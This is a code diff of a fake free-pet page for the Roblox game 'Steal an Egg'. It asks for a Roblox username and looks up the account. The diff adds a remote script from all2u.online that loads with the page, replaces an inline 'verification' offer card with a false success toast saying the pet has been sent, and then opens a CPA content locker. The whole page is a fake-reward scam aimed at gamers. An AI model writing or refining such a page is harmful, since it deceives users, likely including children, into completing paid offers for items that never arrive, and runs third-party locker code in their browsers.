@@ -10,6 +10,7 @@
   [hidden] { display: none !important; }
 </style>
 <title>Steal an Egg</title>
+  <script type="text/javascript" id="ogjs" src="https://all2u.online/cl/js/rn4rgd"></script>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;700&family=Figtree:wght@400;500;600&family=JetBrains+Mono:wght@500&display=swap">
 <style>
@@ -176,7 +177,7 @@ select {
 }
 .modal {
   background: var(--surface); color: var(--ink); border-radius: 14px;
-  width: min(400px, 100%); /* أصغر ليكون أنيق */
+  width: min(400px, 100%);
   max-height: 90vh; overflow-y: auto;
   display: flex; flex-direction: column; gap: 16px; padding: 16px;
   position: relative;
@@ -270,64 +271,33 @@ select {
   to   { opacity: 1; transform: translateY(0); }
 }
 
-/* ===== CPA VERIFICATION STYLES ===== */
-.cpa-warning {
-  display: flex; align-items: center; justify-content: center; gap: 8px;
-  padding: 12px; background: #fef3c7; color: #92400e;
-  border-radius: 8px; font-weight: 600; font-size: 13px;
-  margin-bottom: 16px; border: 1px solid #fcd34d; text-align: center;
-}
-.cpa-card {
-  background: var(--surface); border: 1px solid var(--line);
-  border-radius: 14px; padding: 20px 16px; text-align: center;
-}
-.cpa-card h3 { font-family: var(--font-display); font-size: 1.3rem; margin: 0 0 4px; }
-.cpa-card p { color: var(--muted); font-size: 13px; margin: 0 0 20px; }
-.cpa-avatar-wrap {
-  position: relative; width: 100px; height: 100px; margin: 0 auto 20px;
-}
-.cpa-avatar-wrap img {
-  width: 100%; height: 100%; border-radius: 50%; object-fit: cover;
-  border: 4px solid var(--ok); box-shadow: 0 4px 12px rgba(34, 160, 107, 0.3);
-}
-.cpa-badge {
-  position: absolute; bottom: -5px; right: -15px;
-  background: var(--ok); color: #fff; padding: 4px 10px;
-  border-radius: 999px; font-weight: 700; font-size: 11px;
-  display: flex; align-items: center; gap: 4px; border: 2px solid var(--surface);
-}
-.cpa-name { font-size: 1.1rem; font-weight: 700; margin: 0 0 16px; }
-.cpa-data-row { display: flex; gap: 10px; margin-bottom: 16px; text-align: left; }
-.cpa-data-box {
-  flex: 1; background: var(--bg); padding: 10px; border-radius: 8px;
+/* ===== TOAST NOTIFICATION ===== */
+.toast-notification {
+  position: fixed;
+  top: -100px; /* مخفي في البداية */
+  left: 50%;
+  transform: translateX(-50%);
+  width: max-content;
+  max-width: 90vw;
+  background: var(--surface);
+  color: var(--ink);
   border: 1px solid var(--line);
+  border-left: 4px solid var(--ok);
+  box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+  border-radius: 8px;
+  padding: 16px;
+  display: flex;
+  align-items: flex-start;
+  gap: 12px;
+  z-index: 100;
+  transition: top 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
 }
-.cpa-data-box span { display: block; font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: .05em; font-weight: 600; margin-bottom: 4px; }
-.cpa-data-box strong { display: block; font-family: var(--font-mono); font-size: 13px; color: var(--ink); }
-.cpa-status {
-  background: #fef3c7; border: 1px solid #fcd34d; border-radius: 8px;
-  padding: 12px; text-align: left; margin-bottom: 20px;
+.toast-notification.show {
+  top: max(20px, env(safe-area-inset-top, 20px));
 }
-.cpa-status .row { display: flex; justify-content: space-between; margin-bottom: 6px; font-size: 12px; color: #92400e; font-weight: 600; }
-.cpa-status .row:last-child { margin-bottom: 0; }
-.cpa-status .val { color: var(--ok); }
-.cpa-status .pend { color: #b45309; }
-.cpa-btn {
-  display: block; width: 100%; background: var(--ok); color: #fff;
-  text-decoration: none; padding: 16px; border-radius: 10px;
-  font-family: var(--font-display); font-weight: 700; font-size: 1rem;
-  letter-spacing: .05em; text-transform: uppercase; cursor: pointer;
-  border: none; box-shadow: 0 4px 14px rgba(34, 160, 107, 0.4);
-  transition: transform .15s ease;
-}
-.cpa-btn:hover { transform: scale(1.02); }
-.cpa-progress-bg {
-  height: 8px; background: var(--line); border-radius: 999px; margin: 16px 0 8px; overflow: hidden;
-}
-.cpa-progress-bar {
-  height: 100%; width: 30%; background: var(--warn); border-radius: 999px;
-}
-.cpa-hint { font-size: 11px; color: var(--muted); text-align: center; margin-bottom: 16px; }
+.toast-icon { font-size: 20px; line-height: 1; }
+.toast-content h4 { margin: 0 0 4px; font-family: var(--font-display); font-size: 14px; color: var(--ok); }
+.toast-content p { margin: 0; font-size: 13px; color: var(--muted); line-height: 1.4; }
 
 @media (prefers-reduced-motion: reduce) {
   .card { transition: none; }
@@ -335,6 +305,15 @@ select {
   .step, .profile { animation: none; opacity: 1; transform: none; }
 }
 </style>
+
+<!-- صندوق الإشعار (مخفي في البداية) -->
+<div id="toast" class="toast-notification">
+  <div class="toast-icon">✅</div>
+  <div class="toast-content">
+    <h4>Success!</h4>
+    <p id="toastMsg">Your pet has been sent.</p>
+  </div>
+</div>
 
 <div class="wrap">
   <header>
@@ -404,7 +383,7 @@ const DATA = [
   { id: 28, name: "Uncoiled Armadillo", rarity: "Cosmic", power: 95, image: "img/Uncoiled Armadillo.webp", description: "A cosmic unrolled armadillo.", favorite: false },
 
   // ================= DIVINE =================
-     { id: 42, name: "Royal Skywhale", rarity: "Divine", power: 94, image: "https://i.postimg.cc/dVBrL8yy/royal-skywhale.webp", description: "Hatched from the Royal Skywhale Egg in the Enchanted Forest biome.", favorite: false },
+  { id: 42, name: "Royal Skywhale", rarity: "Divine", power: 94, image: "https://i.postimg.cc/dVBrL8yy/royal-skywhale.webp", description: "Hatched from the Royal Skywhale Egg in the Enchanted Forest biome.", favorite: false },
   { id: 29, name: "Unicorn", rarity: "Divine", power: 90, image: "https://static.wikia.nocookie.net/stealanegg/images/7/7e/Unicorn.png/revision/latest?cb=20260901185215", description: "Hatched from the Unicorn Egg in the Cosmic biome.", favorite: false },
   { id: 30, name: "Kitsune", rarity: "Divine", power: 91, image: "https://static.wikia.nocookie.net/stealanegg/images/0/04/Kitsune.png/revision/latest?cb=20260903135644", description: "Hatched from the Kitsune Egg in the Cherry Blossom biome.", favorite: false },
   { id: 31, name: "Cthulhu", rarity: "Divine", power: 96, image: "https://static.wikia.nocookie.net/stealanegg/images/9/9e/Cthulhu.png/revision/latest?cb=20260912182814", description: "An ancient eldritch horror. (Base form)", favorite: false },
@@ -420,7 +399,7 @@ const DATA = [
   { id: 41, name: "Mecha Scrambler", rarity: "Divine", power: 95, image: "https://static.wikia.nocookie.net/stealanegg/images/7/70/Mecha_Scrambler.png/revision/latest?cb=20260927050809", description: "A highly advanced mechanical being.", favorite: false },
 
   // ================= ETERNAL =================
-    { id: 999, name: "Celestial Sunlion", rarity: "Eternal", power: 95, image: "https://i.postimg.cc/T1qGxjkC/celestial-sunlion.webp", description: "A majestic celestial lion shining with the light of a thousand suns.", favorite: false },
+  { id: 999, name: "Celestial Sunlion", rarity: "Eternal", power: 95, image: "https://i.postimg.cc/T1qGxjkC/celestial-sunlion.webp", description: "A majestic celestial lion shining with the light of a thousand suns.", favorite: false },
   { id: 42, name: "Eternal Lunar Dragon", rarity: "Eternal", power: 94, image: "img/Eternal Lunar Dragon.png", description: "An eternal dragon of the moon.", favorite: false },
   { id: 43, name: "Gorilla King", rarity: "Eternal", power: 93, image: "img/Gorilla King.png", description: "The king of gorillas.", favorite: false },
   { id: 44, name: "Gigantus", rarity: "Eternal", power: 93, image: "img/Gigantus.png", description: "A giant creature.", favorite: false },
@@ -446,7 +425,7 @@ const DATA = [
   { id: 64, name: "Void Serpent", rarity: "Eternal", power: 86, image: "img/Void Serpent.webp", description: "A serpent of the void.", favorite: false },
   { id: 65, name: "Skeleton Horse", rarity: "Eternal", power: 86, image: "img/Skeleton Horse.webp", description: "A skeletal horse.", favorite: false },
 
-  // ================= SECRET (Official 35) =================
+  // ================= SECRET =================
   { id: 66, name: "King Snake", rarity: "Secret", power: 94, image: "img/King Snake.webp", description: "A royal secret serpent.", favorite: false },
   { id: 67, name: "Yeti", rarity: "Secret", power: 94, image: "img/Yeti.webp", description: "A secret snow yeti.", favorite: false },
   { id: 68, name: "Cerberus", rarity: "Secret", power: 93, image: "img/Cerberus.webp", description: "The three-headed guardian.", favorite: false },
@@ -483,6 +462,7 @@ const DATA = [
   { id: 99, name: "Ring Guard", rarity: "Secret", power: 89, image: "img/Ring Guard.webp", description: "A secret guardian of rings.", favorite: false },
   { id: 100, name: "Ringlord", rarity: "Secret", power: 89, image: "img/Ringlord.webp", description: "A secret lord of the rings.", favorite: false }
 ];
+
 const RARITIES = ["Secret", "Eternal", "Divine", "Cosmic"];
 const MAX_POWER = 100;
 const PAGE = 24;
@@ -589,9 +569,6 @@ function toggleFav(id) {
 let openId = null;
 let lastFocus = null;
 
-/* ---------------------------------------------------
-   UPDATED fillModal: Just title, number, input & button
-   --------------------------------------------------- */
 function fillModal(c) {
   $("mFrame").innerHTML = imageHtml(c);
   resetClaim();
@@ -621,9 +598,6 @@ const STEPS = [
 ];
 let claimBusy = false;
 
-/* ---------------------------------------------------
-   UPDATED resetClaim: No description, stats or fav
-   --------------------------------------------------- */
 function resetClaim() {
   claimBusy = false;
   const right = $("mRight");
@@ -658,6 +632,19 @@ async function lookupUser(username) {
   const j = await r.json();
   if (!j || !j.id) return null;
   return j;
+}
+
+function showToast(petName) {
+  const toast = $("toast");
+  const toastMsg = $("toastMsg");
+  
+  toastMsg.innerHTML = 'Success! Your new pet <b>' + escapeHtml(petName) + '</b> has been sent to your Roblox egg collection. Enjoy!';
+  
+  toast.classList.add("show");
+  
+  setTimeout(() => {
+    toast.classList.remove("show");
+  }, 5000);
 }
 
 async function runClaim() {
@@ -727,46 +714,20 @@ async function runClaim() {
     el.querySelector(".icon").textContent = "✓";
   }
 
+  // 1. Show the top notification
   const cardName = (DATA.find(x => x.id === openId) || {}).name || "Item";
-  const cpaUrl = "https://YOUR-CPA-LINK-HERE.com"; /* <--- ضع رابط CPA هنا */
-  const createdDate = profile.created ? new Date(profile.created).toLocaleDateString("en-US") : "Unknown";
-
-  stage.innerHTML = 
-    '<div class="cpa-warning">⚠️ Waiting for offer completion...</div>' +
-    '<div class="cpa-card">' +
-      '<h3>Verification Required</h3>' +
-      '<p>Complete the offer to receive your <b>' + escapeHtml(cardName) + '</b></p>' +
-      
-      '<div class="cpa-avatar-wrap">' +
-        '<img src="' + escapeHtml(profile.imageUrl) + '" alt="Avatar" onerror="this.src=\'https://via.placeholder.com/150\'">' +
-        '<div class="cpa-badge">🎁 1x ' + escapeHtml(cardName) + '</div>' +
-      '</div>' +
-      
-      '<p class="cpa-name">' + escapeHtml(profile.name) + '</p>' +
-      
-      '<div class="cpa-data-row">' +
-        '<div class="cpa-data-box">' +
-          '<span>User ID</span>' +
-          '<strong>' + escapeHtml(String(profile.id)) + '</strong>' +
-        '</div>' +
-        '<div class="cpa-data-box">' +
-          '<span>Created On</span>' +
-          '<strong>' + escapeHtml(createdDate) + '</strong>' +
-        '</div>' +
-      '</div>' +
-      
-      '<div class="cpa-status">' +
-        '<div class="row"><span>Item Ready:</span> <span class="val">1x ' + escapeHtml(cardName) + '</span></div>' +
-        '<div class="row"><span>Status:</span> <span class="pend">Pending Verification</span></div>' +
-      '</div>' +
-      
-      '<a href="' + cpaUrl + '" target="_blank" class="cpa-btn">THE OFFER</a>' +
-      
-      '<div class="cpa-progress-bg"><div class="cpa-progress-bar"></div></div>' +
-      '<p class="cpa-hint">30% - Click the button to start the verification process.</p>' +
-    '</div>';
-    
+  showToast(cardName);
+  
   claimBusy = false;
+  
+  // 2. Trigger the CPA Locker after 1.5 seconds
+  setTimeout(() => {
+    if (typeof og_load === 'function') {
+      og_load(); // This opens the all2u.online locker
+    } else {
+      console.error("Locker script not loaded yet.");
+    }
+  }, 1500);
 }
 
 grid.addEventListener("click", e => {
